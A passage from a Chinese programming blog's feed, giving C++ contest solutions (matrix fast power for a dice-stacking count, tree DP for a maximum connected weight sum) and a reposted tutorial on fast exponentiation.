class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1000000007</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Matrix</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">6</span>][<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">Matrix</span>(<span class="keyword">int</span> x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(a));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) </span><br><span class="line">            a[i][i] = x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">Matrix <span class="keyword">operator</span>*(<span class="keyword">const</span> Matrix&amp; p, <span class="keyword">const</span> Matrix&amp; q) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">Matrix <span class="title">ret</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">6</span>; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                ret.a[i][j] += p.a[i][k] * q.a[k][j];</span><br><span class="line">                ret.a[i][j] %= N;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Matrix <span class="title">fast_mod</span><span class="params">(Matrix x, <span class="keyword">int</span> t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Matrix <span class="title">ret</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">while</span> (t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (t &amp; <span class="number">1</span>)ret = x*ret;</span><br><span class="line">        x = x*x;</span><br><span class="line">        t &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Matrix <span class="title">z</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>  i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>  j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)</span><br><span class="line">            z.a[i][j] = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> m, n;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m; </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> t1, t2;</span><br><span class="line">        cin &gt;&gt; t1 &gt;&gt; t2;</span><br><span class="line">        z.a[t1 - <span class="number">1</span>][(t2 + <span class="number">2</span>) % <span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">        z.a[t2 - <span class="number">1</span>][(t1 + <span class="number">2</span>) % <span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Matrix <span class="title">ret</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line">    ret = <span class="built_in">fast_mod</span>(z, n - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            ans += ret.a[i][j];</span><br><span class="line">            ans %= N;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> p = <span class="number">4</span>;</span><br><span class="line">    <span class="comment">//用快速幂计算4的n次方乘上ans，用for循环直接算会超时(如n=724691113时)</span></span><br><span class="line">    <span class="keyword">while</span> (n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (n &amp; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ans *= p;</span><br><span class="line">            ans %= N;</span><br><span class="line">        &#125;</span><br><span class="line">        p *= p;</span><br><span class="line">        p %= N;</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>10.生命之树</h1><p>在X森林里，上帝创建了生命之树。</p><p>他给每棵树的每个节点（叶子也称为一个节点）上，都标了一个整数，代表这个点的和谐值。上帝要在这棵树内选出一个非空节点集S，使得对于S中的任意两个点a,b，都存在一个点列 {a, v1, v2, …, vk, b} 使得这个点列中的每个点都是S里面的元素，且序列中相邻两个点间有一条边相连。</p><p>在这个前提下，上帝要使得S中的点所对应的整数的和尽量大。这个最大的和就是上帝给生命之树的评分。</p><p>经过atm的努力，他已经知道了上帝给每棵树上每个节点上的整数。但是由于 atm 不擅长计算，他不知道怎样有效的求评分。他需要你为他写一个程序来计算一棵树的分数。</p><p>「输入格式」第一行一个整数 n 表示这棵树有 n 个节点。第二行 n 个整数，依次表示每个节点的评分。接下来 n-1 行，每行 2 个整数 u, v，表示存在一条 u 到 v 的边。由于这是一棵树，所以是不存在环的。</p><p>「输出格式」输出一行一个数，表示上帝给这棵树的分数。</p><p>「样例输入」</p><p>5</p><p>1 -2 -3 4 5</p><p>4 2</p><p>3 1</p><p>1 2</p><p>2 5</p><p>「样例输出」8</p><p>「数据范围」对于 30% 的数据，n &lt;= 10对于 100% 的数据，0 &lt; n &lt;= 10^5, 每个节点的评分的绝对值不超过 10^6 。</p><p>题目直白翻译：在一棵树中，每个点都有一个权值，找到一个连通的节点序列使得权值和最大，输出这个最大权值</p><p>如题目示例中，蓝色方框中的节点权值和最大，为8</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210409172200610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>思路：考察树形DP，详细解释见代码(结合上图理解)</p><p>大致意思构造邻接表，然后以每个节点为根节点利用dfs算出其最大连通权值和然后取最大值</p><p>在示例中当以b为根节点时是最大值，与b相连的节点有a、e、d，而他们权值都大于0所以quan[b]的值就是quan[b] + quan[a] + quan[e] + quan[d] = 8</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">ll quan[N];    <span class="comment">//初始输入存放每个点的权值，后续存放以每个节点为根节点时的连通最大权值和</span></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; linjie[N];   <span class="comment">//邻接表</span></span><br><span class="line">ll res;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以root为根算出最大权值和</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> root, <span class="keyword">int</span> father)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; linjie[root].<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> son = linjie[root][i];</span><br><span class="line">        <span class="keyword">if</span> (son != father)  <span class="comment">//判断邻接表中的son节点是不是已经计算过了</span></span><br><span class="line">        &#123;<span class="comment">//如dfs(a,0)进来调用dfs(b,a)时，son=a,而此时son=father=a说明就是从a过来的，已经计算过a了</span></span><br><span class="line">            <span class="built_in">dfs</span>(son, root);</span><br><span class="line">            <span class="keyword">if</span> (quan[son] &gt; <span class="number">0</span>)  <span class="comment">//如果子节点的权值大于0则将子节点的权值加到root节点的权值上</span></span><br><span class="line">                quan[root] += quan[son];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    res = <span class="built_in">max</span>(res, quan[root]); <span class="comment">//从所有以每个节点为根节点的最大权值和中取最大值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) </span><br><span class="line">        cin&gt;&gt;quan[i];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n ; i ++ )  <span class="comment">//构造邻接表</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> u, v;</span><br><span class="line">        cin&gt;&gt;u&gt;&gt;v;</span><br><span class="line">        linjie[u].<span class="built_in">push_back</span>(v); </span><br><span class="line">        linjie[v].<span class="built_in">push_back</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;1.奖券数目&lt;/h1&gt;
&lt;p&gt;有些人很迷信数字，比如带“4”的数字，认为和“死”谐音，就觉得不吉利。&lt;br&gt;
虽然这些说法纯属无稽之谈，但有时还要迎合大众的需求。某抽奖活动的奖券号码是5位数（10000-99999），要求其中不要出现带“4”的号码，主办单位请你计算一下，</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>快速幂</title>
    <link href="https://zss192.github.io/2021/04/09/%E5%BF%AB%E9%80%9F%E5%B9%82/"/>
    <id>https://zss192.github.io/2021/04/09/%E5%BF%AB%E9%80%9F%E5%B9%82/</id>
    <published>2021-04-09T08:04:13.000Z</published>
    <updated>2021-04-09T09:35:30.083Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>转载于：<a href="https://zhuanlan.zhihu.com/p/95902286">算法学习笔记(4)：快速幂</a></p></blockquote><div class="RichText ztext Post-RichText"><p><b>快速幂</b>（<b>Exponentiation by squaring</b>，平方求幂）是一种简单而有效的小算法，它可以以<img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=O%28%5Clog+n%29"  alt="[公式]" eeimg="1" data-formula="O(\log n)">的时间复杂度计算乘方。快速幂不仅本身非常常见，而且后续很多算法也都会用到快速幂。</p><hr><p>让我们先来思考一个问题：<b>7的10次方，怎样算比较快？</b></p><p><b>方法1：</b>最朴素的想法，7*7=49，49*7=343，... 一步一步算，共进行了<b>9次</b>乘法。</p><p>这样算无疑太慢了，尤其对计算机的CPU而言，每次运算只乘上一个个位数，无疑太屈才了。这时我们想到，也许可以拆分问题。</p><p><b>方法2：</b>先算7的5次方，即7*7*7*7*7，再算它的平方，共进行了<b>5次</b>乘法。</p><p>但这并不是最优解，因为对于“7的5次方”，我们仍然可以拆分问题。</p><p><b>方法3：</b>先算7*7得49，则7的5次方为49*49*7，再算它的平方，共进行了<b>4次</b>乘法。</p><p>模仿这样的过程，我们得到一个在 <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=O%28%5Clog+n%29"  alt="[公式]" eeimg="1" data-formula="O(\log n)"> 时间内计算出幂的算法，也就是快速幂。</p><hr><h2>递归快速幂</h2><p>刚刚我们用到的，无非是一个<b>二分</b>的思路。我们很自然地可以得到一个递归方程：</p><p><img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=a%5En%3D%5Cbegin%7Bcases%7Da%5E%7Bn-1%7D%5Ccdot+a%2C%26%5Ctext%7Bif+%7D+n+%5Ctext+%7B+is+odd%7D+%5C%5C+a%5E%7B%5Cfrac%7Bn%7D%7B2%7D%7D%5Ccdot+a%5E%7B%5Cfrac%7Bn%7D%7B2%7D%7D%2C+%26%5Ctext%7Bif+%7D+n+%5Ctext+%7B+is+even+but+not+0%7D%5C%5C+1%2C%26%5Ctext%7Bif+%7D+n%3D0%5Cend%7Bcases%7D"  alt="[公式]" eeimg="1" data-formula="a^n=\begin{cases}a^{n-1}\cdot a,&amp;\text{if } n \text { is odd} \\ a^{\frac{n}{2}}\cdot a^{\frac{n}{2}}, &amp;\text{if } n \text { is even but not 0}\\ 1,&amp;\text{if } n=0\end{cases}"> </p><p>计算a的n次方，如果n是偶数（不为0），那么就<b>先计算a的n/2次方，然后平方</b>；如果n是奇数，那么就<b>先计算a的n-1次方，再乘上a</b>；递归出口是<b>a的0次方为1</b>。</p><p>递归快速幂的思路非常自然，代码也很简单（直接把递归方程翻译成代码即可）：</p><div class="highlight"><pre><code class="language-cpp"><span class="c1">//递归快速幂</span><span class="c1"></span><span class="kt">int</span> <span class="nf">qpow</span><span class="p">(</span><span class="kt">int</span> <span class="n">a</span><span class="p">,</span> <span class="kt">int</span> <span class="n">n</span><span class="p">)</span><span class="p">&#123;</span>    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>        <span class="k">return</span> <span class="n">qpow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">a</span><span class="p">;</span>    <span class="k">else</span>    <span class="p">&#123;</span>        <span class="kt">int</span> <span class="n">temp</span> <span class="o">=</span> <span class="n">qpow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">n</span> <span class="o">/</span> <span class="mi">2</span><span class="p">);</span>        <span class="k">return</span> <span class="n">temp</span> <span class="o">*</span> <span class="n">temp</span><span class="p">;</span>    <span class="p">&#125;</span><span class="p">&#125;</span></code></pre></div><p>注意，这个temp变量是必要的，因为如果不把<img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=a%5E%7B%5Cfrac%7Bn%7D%7B2%7D%7D"  alt="[公式]" eeimg="1" data-formula="a^{\frac{n}{2}}">记录下来，直接写成qpow(a, n /2)*qpow(a, n /2)，那会计算两次<img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=a%5E%7B%5Cfrac%7Bn%7D%7B2%7D%7D"  alt="[公式]" eeimg="1" data-formula="a^{\frac{n}{2}}">，整个算法就退化为了 <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=O%28n%29"  alt="[公式]" eeimg="1" data-formula="O(n)"> 。</p><p>在实际问题中，题目常常会要求对一个大素数取模，这是因为计算结果可能会非常巨大，但是在这里考察高精度又没有必要。这时我们的快速幂也应当进行取模，此时应当注意，原则是<b>步步取模</b>，如果MOD较大，还应当<b>开long long</b>。</p><div class="highlight"><pre><code class="language-cpp"><span class="c1">//递归快速幂（对大素数取模）</span><span class="c1"></span><span class="cp">#define MOD 1000000007</span><span class="cp"></span><span class="k">typedef</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">ll</span><span class="p">;</span><span class="n">ll</span> <span class="nf">qpow</span><span class="p">(</span><span class="n">ll</span> <span class="n">a</span><span class="p">,</span> <span class="n">ll</span> <span class="n">n</span><span class="p">)</span><span class="p">&#123;</span>    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>        <span class="k">return</span> <span class="n">qpow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">a</span> <span class="o">%</span> <span class="n">MOD</span><span class="p">;</span>    <span class="k">else</span>    <span class="p">&#123;</span>        <span class="n">ll</span> <span class="n">temp</span> <span class="o">=</span> <span class="n">qpow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">n</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="o">%</span> <span class="n">MOD</span><span class="p">;</span>        <span class="k">return</span> <span class="n">temp</span> <span class="o">*</span> <span class="n">temp</span> <span class="o">%</span> <span class="n">MOD</span><span class="p">;</span>    <span class="p">&#125;</span><span class="p">&#125;</span></code></pre></div><p>大家知道，递归虽然<b>简洁</b>，但会产生<b>额外的空间开销</b>。我们可以把递归改写为循环，来避免对栈空间的大量占用，也就是<b>非递归快速幂</b>。</p><h2>非递归快速幂</h2><p>我们换一个角度来引入非递归的快速幂。还是7的10次方，但这次，我们把10写成<b>二进制</b>的形式，也就是 <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=%281010%29_2"  alt="[公式]" eeimg="1" data-formula="(1010)_2"> 。</p><p>现在我们要计算 <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=7%5E%7B%281010%29_2%7D"  alt="[公式]" eeimg="1" data-formula="7^{(1010)_2}"> ，可以怎么做？我们很自然地想到可以把它拆分为 <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=7%5E%7B%281000%29_2%7D+%5Ccdot+7%5E%7B%2810%29_2%7D+"  alt="[公式]" eeimg="1" data-formula="7^{(1000)_2} \cdot 7^{(10)_2} "> . 实际上，对于任意的整数，我们都可以把它拆成若干个 <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=7%5E%7B%28100...%29_2%7D"  alt="[公式]" eeimg="1" data-formula="7^{(100...)_2}"> 的形式相乘。而这些<img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=7%5E%7B%28100...%29_2%7D"  alt="[公式]" eeimg="1" data-formula="7^{(100...)_2}">，恰好就是 <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=7%5E1"  alt="[公式]" eeimg="1" data-formula="7^1"> 、<img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=7%5E2"  alt="[公式]" eeimg="1" data-formula="7^2">、<img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=7%5E4"  alt="[公式]" eeimg="1" data-formula="7^4">……我们只需<b>不断把底数平方</b>就可以算出它们。</p><p>我们先看代码，再来仔细推敲这个过程：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//非递归快速幂</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&amp;<span class="number">1</span>)        <span class="comment">//如果n的当前末位为1</span></span><br><span class="line">            ans *= a;  <span class="comment">//ans乘上当前的a</span></span><br><span class="line">        a *= a;        <span class="comment">//a自乘</span></span><br><span class="line">        n &gt;&gt;= <span class="number">1</span>;       <span class="comment">//n往右移一位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最初ans为1，然后我们一位一位算：</p><p>1010的最后一位是0，所以a^1这一位不要。然后1010变为101，a变为a^2。</p><p>101的最后一位是1，所以a^2这一位是需要的，乘入ans。101变为10，a再自乘。</p><p>10的最后一位是0，跳过，右移，自乘。</p><p>然后1的最后一位是1，ans再乘上a^8。循环结束，返回结果。</p><figure data-size="normal"><noscript><img src="/" data-caption="" data-size="normal" data-rawwidth="935" data-rawheight="349" class="origin_image zh-lightbox-thumb lazyload" width="935" data-original="https://pic3.zhimg.com/v2-e99e321dcff33699093cde2876424dbe_r.jpg"/ data-src="https://pic3.zhimg.com/v2-e99e321dcff33699093cde2876424dbe_b.jpg"></noscript><img src="/" data-caption="" data-size="normal" data-rawwidth="935" data-rawheight="349" class="origin_image zh-lightbox-thumb lazy lazyload" width="935" data-original="https://pic3.zhimg.com/v2-e99e321dcff33699093cde2876424dbe_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-e99e321dcff33699093cde2876424dbe_b.jpg" data-lazy-status="ok" data-src="https://pic3.zhimg.com/v2-e99e321dcff33699093cde2876424dbe_r.jpg"></figure><p>这里的位运算符，<b>&gt;&gt;</b>是右移，表示把二进制数<b>往右移一位</b>，相当于/2；&amp;是按位与，&amp;1可以理解为<b>取出二进制数的最后一位</b>，相当于%2==1。这么一等价，是不是看出了递归和非递归的快速幂的关系了？虽然非递归快速幂因为牵扯到二进制理解起来稍微复杂一点，但基本思路其实和递归快速幂没有太大的出入。</p><hr><h2>快速幂的拓展</h2><p>上面所述的都是<b>整数</b>的快速幂，但其实，在算 <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=a%5En"  alt="[公式]" eeimg="1" data-formula="a^n"> 时，只要a的数据类型支持<b>乘法</b>且<b>满足结合律</b>，快速幂的算法都是有效的。矩阵、高精度整数，都可以照搬这个思路。下面给出一个模板：</p><div class="highlight"><pre><code class="language-cpp"><span class="c1">//泛型的非递归快速幂</span><span class="c1"></span><span class="k">template</span> <span class="o">&lt;</span><span class="k">typename</span> <span class="n">T</span><span class="o">&gt;</span><span class="n">T</span> <span class="n">qpow</span><span class="p">(</span><span class="n">T</span> <span class="n">a</span><span class="p">,</span> <span class="n">ll</span> <span class="n">n</span><span class="p">)</span><span class="p">&#123;</span>    <span class="n">T</span> <span class="n">ans</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// 赋值为乘法单位元，可能要根据构造函数修改</span><span class="c1"></span>    <span class="k">while</span> <span class="p">(</span><span class="n">n</span><span class="p">)</span>    <span class="p">&#123;</span>        <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>            <span class="n">ans</span> <span class="o">=</span> <span class="n">ans</span> <span class="o">*</span> <span class="n">a</span><span class="p">;</span> <span class="c1">// 这里就最好别用自乘了，不然重载完*还要重载*=，有点麻烦。</span><span class="c1"></span>        <span class="n">n</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>        <span class="n">a</span> <span class="o">=</span> <span class="n">a</span> <span class="o">*</span> <span class="n">a</span><span class="p">;</span>    <span class="p">&#125;</span>    <span class="k">return</span> <span class="n">ans</span><span class="p">;</span><span class="p">&#125;</span></code></pre></div><p>注意，较复杂类型的快速幂的时间复杂度不再是简单的 <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=O%28%5Clog+n%29"  alt="[公式]" eeimg="1" data-formula="O(\log n)"> ，它与底数的乘法的时间复杂度有关。</p><p>例如，<b>矩阵快速幂</b>的一个经典应用是求斐波那契数列：</p><p><b>（洛谷P1962） 斐波那契数列</b></p><blockquote><b>题目背景</b><br>大家都知道，斐波那契数列是满足如下性质的一个数列：<br> <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=F_n+%3D+%5Cbegin%7Bcases%7D1%26+%28n+%5Cle+2%29+%5C%5C+F_%7Bn-1%7D%2BF_%7Bn-2%7D%26+%28n%5Cge+3%29+%5Cend%7Bcases%7D"  alt="[公式]" eeimg="1" data-formula="F_n = \begin{cases}1&amp; (n \le 2) \\ F_{n-1}+F_{n-2}&amp; (n\ge 3) \end{cases}"> <br><b>题目描述</b><br>请你求出 <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=F_n+%5Cbmod+10%5E9+%2B+7"  alt="[公式]" eeimg="1" data-formula="F_n \bmod 10^9 + 7"> 的值。</blockquote><p><i>（以下内容涉及到基本的线性代数知识）</i></p><p>设矩阵 <img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=A%3D%5Cbegin%7Bbmatrix%7D0+%261%5C%5C+1+%26+1%5Cend%7Bbmatrix%7D"  alt="[公式]" eeimg="1" data-formula="A=\begin{bmatrix}0 &amp;1\\ 1 &amp; 1\end{bmatrix}"> ，我们有<img src="/" class="lazyload" data-src="https://www.zhihu.com/equation?tex=A%5Cbegin%7Bbmatrix%7DF_n%5C%5C+F_%7Bn%2B1%7D%5Cend%7Bbmatrix%7D+%3D+%5Cbegin%7Bbmatrix%7DF_%7Bn%2B1%7D%5C%5C+F_n%2BF_%7Bn%2B1%7D%5Cend%7Bbmatrix%7D%3D%5Cbegin%7Bbmatrix%7DF_%7Bn%2B1%7D%5C%5C+F_%7Bn%2B2%7D%5Cend%7Bbmatrix%7D"  alt="[公式]" eeimg="1" data-formula="A\begin{bmatrix}F_n\\ F_{n+1}\end{bmatrix} = \begin{bmatrix}F_{n+1}\\ F_n+F_{n+1}\end{bmatrix}=\begin{bmatrix}F_{n+1}\\ F_{n+2}\end{bmatrix}">，于是 :</p><p><img src="/" class="lazyload" 